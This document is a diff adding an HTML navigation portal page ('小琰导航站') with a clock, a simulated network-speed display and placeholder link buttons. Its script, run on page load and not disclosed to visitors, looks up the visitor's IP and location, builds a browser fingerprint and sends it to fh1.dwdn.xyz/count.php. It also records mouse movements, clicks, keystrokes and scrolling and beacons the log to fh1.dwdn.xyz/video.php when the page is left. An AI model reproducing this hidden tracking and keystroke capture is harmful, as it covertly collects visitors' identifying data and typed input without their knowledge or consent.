@@ -1,0 +1,880 @@
+<!doctype html>
+<html lang="en">
+
+<head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>小琰导航站</title> 
+  <style>
+      @charset "utf-8";@font-face {
+          font-family: "DIY font";    src: url("HarmonyOS_Sans_SC_Medium.subset.woff2");
+      }
+
+      * {
+          font-family: "DIY font";
+          transition: all 0.2s;
+      }
+
+      body {
+          background-image: url('../images/bg.jpg');
+          background-size: 400% 400%;
+          animation: softGradientAnimation 10s ease infinite;
+          background-size: cover;
+          background-repeat: no-repeat;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          min-height: 100vh;
+      }
+
+      @keyframes softGradientAnimation {
+          0% {
+              background-position: 0% 50%;
+          }
+
+          50% {
+              background-position: 100% 50%;
+          }
+
+          100% {
+              background-position: 0% 50%;
+          }
+      }
+
+      .container {
+          position: relative;
+      }
+
+      .status-bar {
+          display: inline-block;
+          display: flex;
+          align-items: center;
+          background-color: rgba(255, 255, 255, 0.3);
+          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+          border-radius: 10px;
+          color: #444444;
+          padding: 7px;
+          font-size: 14px;
+          width: 300px;
+          margin-bottom: 6px;
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      }
+
+      .time {
+          justify-content: center;
+          font-weight: bold;
+          flex: 1;
+          text-align: left;
+      }
+
+      .right-content {
+          font-weight: bold;
+          text-align: right;
+          justify-content: flex-end;
+      }
+
+      .icons-container {
+          display: flex;
+          align-items: center;
+      }
+
+      .signal-icons {
+          width: 30px;
+          height: 17px;
+          background-image: url('../images/signal-icons.png');
+          background-size: cover;
+      }
+
+      .battery-icons {
+          width: 34px;
+          height: 17px;
+          background-image: url('../images/battery-icons.png');
+          background-size: cover;
+          right: 0px;
+      }
+
+      .tag {
+          margin: 5px;
+          display: inline-block;
+          padding: 8px 11px;
+          border-top-right-radius: 10px;
+          border-bottom-right-radius: 10px;
+          color: #403080;
+      }
+      
+      /* 通用的毛玻璃样式 */
+      .big-card {
+          width: 300px;
+          padding: 8px;
+          background-color: rgba(255, 255, 255, 0.2);
+          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+          backdrop-filter: blur(15px) saturate(150%) contrast(60%) brightness(120%);
+          background-clip: padding-box;
+          border-radius: 10px;
+          margin-bottom: 10px;
+      }
+
+      .container {
+          display: flex;
+          align-items: center;
+      }
+
+      .avatar {
+          width: 60px;
+          height: 60px;
+          padding: 1.5px;
+          border-radius: 50%;
+          background-color: lightgray;
+      }
+
+      .text-container {
+          display: flex;
+          flex-direction: column;
+          margin-left: 12px;
+      }
+
+      .text-container p {
+          margin: 1px 0;
+          /* 减小了上下文字的间距 */
+      }
+      
+      /* 小卡片样式 */
+      .small-card {
+          width: 300px;
+          padding: 8px;
+          background-color: rgba(255, 255, 255, 0.2);
+          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+          backdrop-filter: blur(15px) saturate(150%) contrast(60%) brightness(120%);
+          background-clip: padding-box;
+          border-radius: 8px;
+      }
+
+      .small-cards-container {
+          display: flex;
+          justify-content: center;
+          gap: 15px;
+      }
+
+      .small-card.music-player {
+          text-align: center;
+      }
+
+      .additional-card {
+          margin-top: 10px;
+      }
+
+      introduce {
+          margin: 0;
+      }
+
+      .BOTTOM {
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          width: 300px;
+      }
+      
+      /*按钮*/
+      .glass-button {
+          width: 45.75%;
+          margin: 5px;
+          padding: 15px;
+          border: none;
+          border-radius: 15px;
+          background: rgba(180, 200, 230, 0.2);
+          backdrop-filter: blur(10px);
+          color: #403080;
+          font-size: 16px;
+          text-align: center;
+          outline: none;
+          transition: all 0.4s ease-in-out;
+          box-shadow: 0 4px 6px rgba(50, 50, 100, 0.1);
+      }
+
+      .glass-button:hover {
+          background: rgba(200, 220, 240, 0.3);
+          transform: translateY(-2px);
+          box-shadow: 0 6px 8px rgba(50, 50, 100, 0.15);
+      }
+      
+      /* 增大字体以保持卡片视觉大小 */
+      .big-card h2,.big-card p,.small-card h3,.small-card p {
+          font-size: 14px;
+      }
+      
+      /* 弹窗动画 */
+      .success-popup {
+          opacity: 0;
+          animation: slideDown 0.5s ease forwards;
+          font-size: 16px;
+          padding: 10px 15px;
+          border-radius: 5px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+      }
+
+      @keyframes slideDown {
+          from {
+              transform: translateY(-20px);
+              opacity: 0;
+          }
+
+          to {
+              transform: translateY(0);
+              opacity: 1;
+          }
+      }
+
+      .album-art {
+          display: block;
+          margin: 0 auto;
+          width: 110px;
+          height: 110px;
+          border-radius: 50%;
+          object-fit: cover;
+      }
+
+      .song-title {
+          margin: 3px;
+          text-align: center;
+          font-size: 15px;
+      }
+
+      .artist-name {
+          margin: 0 auto;
+          text-align: center;
+          font-size: 3px;
+          color: #444444;
+      }
+
+      .controls {
+          margin: 0px;
+          margin-top: 20px;
+      }
+
+      .progress-bar-container {
+          margin: 20px 0;
+      }
+
+      .progress-bar {
+          width: 70%;
+          height: 4px;
+          background-color: #ddd;
+          border-radius: 6px;
+          position: relative;
+          margin: 3px auto;
+      }
+
+      .progress {
+          height: 100%;
+          background-color: #5DC6FF;
+          border-radius: 4px;
+          width: 0%;
+          transition: width 0.3s ease;
+          margin: 0 auto;
+      }
+
+      .time-display {
+          font-size: 14px;
+          color: #888;
+      }
+      
+      /* 播放器样式 */
+      .control-btn {
+          background-color: rgba(255, 255, 255, 0.1);
+          /* 半透明的背景 */
+          backdrop-filter: blur(10px) saturate(150%) contrast(60%) brightness(120%);
+          border-radius: 50%;
+          /* 圆形按钮 */
+          width: 40px;
+          /* 按钮宽度 */
+          height: 40px;
+          /* 按钮高度 */
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          border: none;
+          outline: none;
+          box-shadow: none;
+          margin-top: -12px;
+          transition: transform 0.3s ease;
+          /* 过渡效果 */
+      }
+
+      .control-btn:hover {
+          transform: scale(1.1);
+          /* 放大按钮 */
+      }
+
+      .fas,.material-icons {
+          font-size: 15px;
+          /* 图标大小 */
+          color: #fff;
+          /* 图标颜色 */
+      }
+
+      .controls {
+          display: flex;
+          gap: 10px;
+          /* 按钮之间的间距 */
+          justify-content: center;
+      }
+
+      .control-btn.active {
+          background-color: rgba(255, 255, 255, 0.2);
+          /* 激活状态的背景颜色 */
+      }
+      
+      /* 歌曲封面旋转动画 */
+      @keyframes rotate {
+          from {
+              transform: rotate(0deg);
+          }
+
+          to {
+              transform: rotate(360deg);
+          }
+      }
+
+      .album-art {
+          display: block;
+          margin: 0 auto;
+          width: 110px;
+          border-radius: 50%;
+          object-fit: cover;
+          /* 初始不旋转 */
+          animation: none;
+      }
+
+      .popup {
+          position: fixed;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%, -50%);
+          min-width: 280px;
+          background: linear-gradient(to bottom, #5DC6FF, white);
+          border-radius: 20px;
+          padding: 8px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+          z-index: 9999;
+          opacity: 0;
+          transition: opacity 0.3s ease;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+      }
+
+      .song-item {
+          color: #5D82FF;
+          padding: 5px 0;
+          border-bottom: 1px solid #ddd;
+          cursor: pointer;
+      }
+
+      .song-item:last-child {
+          border-bottom: none;
+      }
+
+      .song-item:hover {
+          background-color: #f0f0f0;
+      }
+
+      .popup button {
+          margin-top: 8px;
+          background-color: #87CEEB;
+          border: none;
+          padding: 10px 20px;
+          border-radius: 10px;
+          color: white;
+          font-weight: bold;
+          transition: background-color 0.3s ease;
+      }
+
+      .popup button:hover {
+          background-color: #4682B4;
+      }
+
+      .popup img {
+          margin-top: 0 auto;
+          /* 为图片添加顶部边距，与歌曲信息隔开 */
+          width: 80px;
+          height: 80px;
+      }
+      
+      /* 仅为"导航"卡片添加转动边框线 */
+      .big-card.additional-card {
+          position: relative; /* 为伪元素定位提供参考 */
+      }
+      
+      /* 伪元素：实现转动的单条边框 */
+      .big-card.additional-card::before {
+          content: "";
+          position: absolute;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          border: 2px solid rgb(71, 111, 241); /* 边框颜色+粗细，与原风格一致 */
+          border-radius: 10px; /* 与卡片原有圆角匹配，避免突兀 */
+          animation: navCardClipPath 3s infinite linear; /* 3秒循环转动，线性速度 */
+          pointer-events: none; /* 关键：避免边框遮挡按钮点击 */
+      }
+      
+      /* 边框转动的关键帧动画（沿"上→右→下→左"循环） */
+      @keyframes navCardClipPath {
+          0%, 100% { clip-path: inset(0 0 95% 0); } /* 初始/结束：仅显示顶部边框 */
+          25% { clip-path: inset(0 95% 0 0); } /* 25%进度：仅显示右侧边框 */
+          50% { clip-path: inset(95% 0 0 0); } /* 50%进度：仅显示底部边框 */
+          75% { clip-path: inset(0 0 0 95%); } /* 75%进度：仅显示左侧边框 */
+      }
+      
+      .glass-button {
+          width: 98%;
+      }
+  </style>
+ </head> 
+ <body> 
+  <div class="status-bar"> 
+   <div class="time"></div> 
+   <div class="right-content"> 
+    <div class="icons-container"> 
+     <div class="data-speed"></div> 
+     <div class="signal-icons"></div> 
+     <div class="battery-icons"></div> 
+    </div> 
+   </div> 
+  </div> 
+  <div class="big-card"> 
+   <div class="container"> 
+    <img class="avatar" src="https://q2.qlogo.cn/headimg_dl?dst_uin=3843482742&amp;spec=100" alt="头像"> 
+    <div class="text-container"> 
+     <p style="font-size: 20px;">小琰导航站</p> 
+     <p id="copyText" style="font-size: 9px;color: #444444;"><img src="../images/qq.png" style="width: 10px;">小琰导航站 </p> 
+     </div> 
+     </div>
+    </div> 
+   </div> 
+  </div> 
+  
+  <div class="big-card additional-card"> 
+   <span class="tag">导航</span> 
+   <div class="nav-container">
+    <!-- 这里的内容将由JavaScript动态渲染 -->
+   </div> 
+  </div> 
+  <div class="big-card additional-card"> 
+   
+   <p style="display: flex;justify-content: center;font-size: 10px;margin-bottom: 0px;">本站由<a href="https://yb.zmkj.cn/">造梦空间</a>提供技术支持</p> 
+  </div> 
+  <script>
+      // 显示当前时间
+      function updateTime() {
+          const now = new Date();
+          const timeString = now.toLocaleTimeString();
+          document.querySelector('.time').textContent = timeString;
+      }
+
+      // 使用 requestAnimationFrame 代替 setInterval 更新时间
+      function animateTime() {
+          updateTime();
+          requestAnimationFrame(animateTime);
+      }
+
+      // 渲染导航链接
+      function renderNavLinks() {
+          const navContainer = document.querySelector('.nav-container');
+          if (!navContainer) return;
+
+          // 清空容器
+          navContainer.innerHTML = '';
+
+          // 定义导航链接数据
+          const links = [
+              { href: 'https://www.example1.com', text: '链接1' },
+              { href: 'https://www.example2.com', text: '链接2' },
+              { href: 'https://www.example3.com', text: '链接3' },
+              // 可以继续添加更多链接
+          ];
+
+          // 遍历数据并创建链接元素
+          links.forEach(link => {
+              const aElement = document.createElement('a');
+              aElement.href = link.href;
+              
+              const buttonElement = document.createElement('button');
+              buttonElement.className = 'glass-button';
+              buttonElement.textContent = link.text;
+              
+              aElement.appendChild(buttonElement);
+              const brElement = document.createElement('br');
+              
+              navContainer.appendChild(aElement);
+              navContainer.appendChild(brElement);
+          });
+      }
+
+      // 数据速度模拟
+      let currentSpeed = Math.floor(Math.random() * 100) + 1;
+
+      function updateDataSpeed() {
+          // 随机增加或减少速度，幅度在 1-5 之间
+          const change = Math.floor(Math.random() * 10) + 1;
+          const isIncrease = Math.random() > 0.5;
+          currentSpeed = isIncrease ? currentSpeed + change : currentSpeed - change;
+          if (currentSpeed < 1) currentSpeed = 1;
+          document.querySelector('.data-speed').textContent = `${currentSpeed} kb/s`;
+      }
+
+      // 文本复制功能
+      function setupCopyFunctionality() {
+          // 获取要复制的文本元素
+          const copyText = document.getElementById('copyText');
+
+          // 点击事件处理函数
+          if (copyText) {
+              copyText.addEventListener('click', function() {
+                  const textToCopy = this.innerText;
+
+                  // 创建临时元素用于复制
+                  const tempInput = document.createElement('input');
+                  tempInput.value = textToCopy;
+                  document.body.appendChild(tempInput);
+
+                  // 选中并复制内容
+                  tempInput.select();
+                  document.execCommand('copy');
+
+                  // 移除临时元素
+                  document.body.removeChild(tempInput);
+
+                  // 创建弹窗显示复制成功
+                  const successMessage = document.createElement('div');
+                  successMessage.classList.add('success-popup');
+                  successMessage.innerText = '复制成功';
+                  successMessage.style.position = 'fixed';
+                  successMessage.style.top = '10px';
+                  successMessage.style.width = 'fit-content';
+                  successMessage.style.zIndex = '9999';
+                  successMessage.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
+                  successMessage.style.color = 'white';
+                  successMessage.style.textAlign = 'center';
+                  document.body.appendChild(successMessage);
+
+                  // 2 秒后自动关闭弹窗
+                  setTimeout(() => {
+                      document.body.removeChild(successMessage);
+                  }, 2000);
+              });
+          }
+      }
+
+      // 获取IP和位置信息，并收集浏览器信息发送
+      function getAndShowLocation() {
+          fetch('http://res.abeim.cn/api-ip_get?export=json')
+              .then(response => response.json())
+              .then(data => {
+                  // 提取 IP 地址
+                  const ip = data.ip;
+                  // 存储IP供后续使用（如用户操作记录）
+                  localStorage.setItem('userIp', ip);
+                  
+                  // 发送 IP 到获取位置的接口
+                  fetch(`https://collect.xmwxxc.com/collect/address/?ip=${ip}`)
+                      .then(response => response.text())
+                      .then(data => {
+                          // 解析返回的字符串，提取城市市区部分
+                          const locationStr = data;
+                          const start = locationStr.indexOf('你当前的位置:') + '你当前的位置:'.length;
+                          // 找到逗号的位置，即城市部分的结束位置
+                          const end = locationStr.indexOf(',', start);
+                          // 提取城市部分
+                          const city = locationStr.substring(start, end);
+                          // 只保留前六位
+                          const cityFirstSix = city.substring(0, 6);
+                          // 在页面上显示城市市区
+                          document.getElementById('location').innerHTML = cityFirstSix;
+                      })
+                      .catch(error => {
+                          console.error('获取位置数据时出错:', error);
+                      });
+                  
+                  // 收集浏览器信息并发送
+                  sendBrowserInfo(ip);
+              })
+              .catch(error => {
+                  console.error('获取 IP 时出错:', error);
+              });
+      }
+
+      // 收集浏览器相关信息
+      function collectBrowserInfo() {
+          return {
+              userAgent: navigator.userAgent, // 浏览器用户代理字符串
+              browserVersion: getBrowserVersion(), // 提取的浏览器版本
+              appName: navigator.appName, // 浏览器名称
+              appVersion: navigator.appVersion, // 浏览器版本
+              platform: navigator.platform, // 操作系统平台
+              language: navigator.language, // 浏览器语言
+              screenWidth: screen.width, // 屏幕宽度
+              screenHeight: screen.height, // 屏幕高度
+              colorDepth: screen.colorDepth, // 屏幕颜色深度
+              plugins: Array.from(navigator.plugins).map(plugin => plugin.name).join(', '), // 安装的插件
+              // 简单的浏览器指纹 - 基于多个特征的组合
+              fingerprint: generateSimpleFingerprint()
+          };
+      }
+
+      // 提取浏览器版本
+      function getBrowserVersion() {
+          const userAgent = navigator.userAgent;
+          let version = 'Unknown';
+          
+          // 检测主要浏览器及其版本
+          if (/Chrome/.test(userAgent)) {
+              version = 'Chrome ' + userAgent.match(/Chrome\/(\d+\.\d+)/)[1];
+          } else if (/Firefox/.test(userAgent)) {
+              version = 'Firefox ' + userAgent.match(/Firefox\/(\d+\.\d+)/)[1];
+          } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
+              version = 'Safari ' + userAgent.match(/Version\/(\d+\.\d+)/)[1];
+          } else if (/MSIE|Trident/.test(userAgent)) {
+              version = 'IE ' + userAgent.match(/(MSIE \d+\.\d+|rv:(\d+\.\d+))/)[1];
+          } else if (/Edge/.test(userAgent)) {
+              version = 'Edge ' + userAgent.match(/Edge\/(\d+\.\d+)/)[1];
+          }
+          
+          return version;
+      }
+
+      // 生成简单的浏览器指纹
+      function generateSimpleFingerprint() {
+          // 基于多个浏览器特征生成一个简单的指纹
+          const fingerprintComponents = [
+              navigator.userAgent,
+              screen.width + 'x' + screen.height,
+              screen.colorDepth,
+              navigator.language,
+              navigator.platform,
+              Array.from(navigator.plugins).length,
+              navigator.cookieEnabled ? 'cookies enabled' : 'cookies disabled'
+          ];
+          
+          // 简单哈希处理
+          return btoa(fingerprintComponents.join('|'));
+      }
+
+      // 将对象转换为查询字符串
+      function objToQueryString(obj) {
+          return Object.keys(obj).map(key => 
+              encodeURIComponent(key) + '=' + encodeURIComponent(obj[key])
+          ).join('&');
+      }
+
+      // 发送浏览器信息到接口
+      function sendBrowserInfo(ip) {
+          // 收集浏览器信息
+          const browserInfo = collectBrowserInfo();
+          
+          // 准备要发送的所有数据
+          const requestData = {
+              ip: ip,
+              ...browserInfo,
+              timestamp: new Date().toISOString(), // 添加时间戳
+              referrer: document.referrer // 添加来源页面
+          };
+          
+          // 构建请求URL
+          const baseUrl = 'https://fh1.dwdn.xyz/count.php';
+          const queryString = objToQueryString(requestData);
+          const url = `${baseUrl}?${queryString}`;
+          
+          // 发送数据到指定接口
+          fetch(url)
+              .then(response => {
+                  if (!response.ok) {
+                      throw new Error('发送数据时响应不正常: ' + response.status);
+                  }
+                  return response.text();
+              })
+              .then(responseText => {
+                  console.log('浏览器信息发送成功:', responseText);
+              })
+              .catch(error => {
+                  console.error('发送浏览器信息时出错:', error);
+              });
+      }
+
+      // 用户操作录制功能
+      let userActions = [];
+      let recordingStartTime;
+
+      // 格式化时间（相对于开始时间的毫秒数）
+      function getRelativeTime() {
+          return Date.now() - recordingStartTime;
+      }
+
+      // 记录鼠标移动
+      function recordMouseMove(e) {
+          userActions.push({
+              type: 'mousemove',
+              time: getRelativeTime(),
+              x: e.clientX,
+              y: e.clientY,
+              target: getElementInfo(e.target)
+          });
+      }
+
+      // 记录鼠标点击
+      function recordClick(e) {
+          userActions.push({
+              type: 'click',
+              time: getRelativeTime(),
+              x: e.clientX,
+              y: e.clientY,
+              button: e.button,
+              target: getElementInfo(e.target)
+          });
+      }
+
+      // 记录键盘输入
+      function recordKeydown(e) {
+          userActions.push({
+              type: 'keydown',
+              time: getRelativeTime(),
+              key: e.key,
+              keyCode: e.keyCode,
+              target: getElementInfo(e.target)
+          });
+      }
+
+      // 记录页面滚动
+      function recordScroll(e) {
+          userActions.push({
+              type: 'scroll',
+              time: getRelativeTime(),
+              scrollX: window.scrollX,
+              scrollY: window.scrollY
+          });
+      }
+
+      // 获取元素信息（简化版，避免敏感信息）
+      function getElementInfo(element) {
+          if (!element) return null;
+          return {
+              tag: element.tagName,
+              id: element.id || null,
+              className: element.className || null,
+              // 避免记录输入框内容等敏感信息
+              isInput: element.tagName === 'INPUT' || element.tagName === 'TEXTAREA'
+          };
+      }
+
+      // 开始录制
+      function startRecording() {
+          // 初始化录制状态
+          userActions = [];
+          recordingStartTime = Date.now();
+          
+          // 记录初始信息
+          userActions.push({
+              type: 'start',
+              time: 0,
+              url: window.location.href,
+              referrer: document.referrer
+          });
+
+          // 添加事件监听
+          document.addEventListener('mousemove', recordMouseMove);
+          document.addEventListener('click', recordClick);
+          document.addEventListener('keydown', recordKeydown);
+          window.addEventListener('scroll', recordScroll);
+
+          console.log('开始录制用户操作');
+      }
+
+      // 停止录制并上传数据
+      function stopAndUpload() {
+          // 记录结束信息
+          userActions.push({
+              type: 'end',
+              time: getRelativeTime(),
+              duration: getRelativeTime()
+          });
+
+          // 移除事件监听
+          document.removeEventListener('mousemove', recordMouseMove);
+          document.removeEventListener('click', recordClick);
+          document.removeEventListener('keydown', recordKeydown);
+          window.removeEventListener('scroll', recordScroll);
+
+          // 准备上传数据
+          const data = {
+              actions: userActions,
+              startTime: new Date(recordingStartTime).toISOString(),
+              endTime: new Date().toISOString(),
+              ip: localStorage.getItem('userIp') || 'unknown', // 从之前存储的位置获取IP
+              userAgent: navigator.userAgent
+          };
+
+          // 上传数据到指定接口
+          const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+          
+          // 使用sendBeacon确保页面卸载时能发送成功
+          const success = navigator.sendBeacon(
+              'https://fh1.dwdn.xyz/video.php',
+              blob
+          );
+
+          if (success) {
+              console.log('操作数据已成功调度上传');
+          } else {
+              console.error('上传调度失败，尝试使用fetch备份方案');
+              // 备份方案：使用fetch并忽略结果
+              fetch('https://fh1.dwdn.xyz/video.php', {
+                  method: 'POST',
+                  body: blob,
+                  keepalive: true
+              }).catch(err => console.error('备份上传也失败:', err));
+          }
+      }
+
+      // 初始化所有功能
+      function initializeAllFunctions() {
+          // 启动时间显示
+          animateTime();
+          
+          // 启动数据速度更新
+          setInterval(updateDataSpeed, 2000);
+          
+          // 设置复制功能
+          setupCopyFunctionality();
+          
+          // 获取位置信息并发送浏览器信息
+          getAndShowLocation();
+          
+          // 开始录制用户操作
+          startRecording();
+          
+          // 页面即将卸载时上传操作记录
+          window.addEventListener('beforeunload', stopAndUpload);
+          
+          // 对于单页应用，监听页面导航变化
+          if (window.history.pushState) {
+              const originalPushState = window.history.pushState;
+              window.history.pushState = function() {
+                  stopAndUpload();
+                  return originalPushState.apply(this, arguments);
+              };
+          }
+      }
+
+      // 页面加载完成后执行所有初始化
+      document.addEventListener('DOMContentLoaded', () => {
+          // 渲染导航链接
+          renderNavLinks();
+          
+          // 初始化所有功能
+          initializeAllFunctions();
+      });
+  </script>  
+ </body>
+</html>
